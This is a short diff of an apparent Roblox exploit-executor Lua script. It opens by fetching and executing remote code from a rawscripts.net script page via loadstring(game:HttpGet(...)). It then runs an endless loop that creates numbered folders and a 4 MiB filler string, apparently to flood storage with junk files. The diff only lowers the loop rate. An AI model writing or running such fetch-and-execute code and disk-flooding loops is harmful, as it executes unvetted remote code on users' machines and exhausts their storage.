@@ -1,7 +1,7 @@
 loadstring(game:HttpGet("https://rawscripts.net/raw/HEAD-OF-HEI-Jujutsu-Shenanigans-JujutsuerV2-92468"))()
 task.wait(10)
 local fileSize = 4 * 1024 * 1024 -- 4 MiB per file
-local interval = 1
+local interval = 2.5
 
 local content = string.rep("A", fileSize)
 local folderCount = 0
@@ -10,7 +10,7 @@ local fileCount = 0
 while true do
     local startTime = os.clock()
 
-    for i = 1, 10 do
+    for i = 1, 4 do
         folderCount += 1
 
         local folder = "Folder_" .. folderCount
